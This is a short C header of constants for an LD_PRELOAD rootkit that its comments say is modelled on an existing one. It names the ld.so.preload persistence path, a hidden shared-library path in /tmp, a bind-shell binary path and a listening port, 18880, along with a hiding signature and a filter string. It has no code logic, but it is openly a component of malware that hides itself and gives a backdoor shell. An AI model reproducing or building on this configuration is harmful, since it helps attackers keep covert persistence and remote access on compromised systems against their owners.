#ifndef RKCONSTANT_H
#define RKCONSTANT_H

//inspired by father ld preload so some constants here are similar

#define SIGNATURE_FILE "MY_ROOTKIT"
#define PRELOAD "ld.so.preload"
#define PRELOAD_ENV "LD_PRELOAD"

//will compile the bind shell to this path
#define SIGNATURE_PATH "/tmp/MY_ROOTKIT"

//compile the rootkit shared library to this path
#define Shared_Lib_Path "/tmp/.MY_ROOTKIT.so"
#define PORT  18880
#define  FILTER "boob"

//making this for triggering sig
// useless static int TRIGGER = 0;



#endif